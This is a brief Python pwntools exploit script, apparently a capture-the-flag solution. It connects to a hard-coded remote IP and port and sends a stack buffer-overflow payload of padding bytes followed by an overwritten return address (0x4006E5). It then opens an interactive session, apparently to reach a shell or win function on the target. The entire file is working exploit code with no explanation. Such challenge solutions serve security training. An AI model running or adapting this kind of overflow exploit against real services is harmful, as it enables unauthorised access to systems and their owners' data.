from pwn import *
context.terminal=['tmux','splitx','-h']
context.log_level='debug'

p=remote("121.37.132.113",10000)

# p=process("./bug")
payload=32*b'A'+8*b'B'+p64(0x4006E5)
p.sendafter(b'hello world\n',payload)
p.interactive()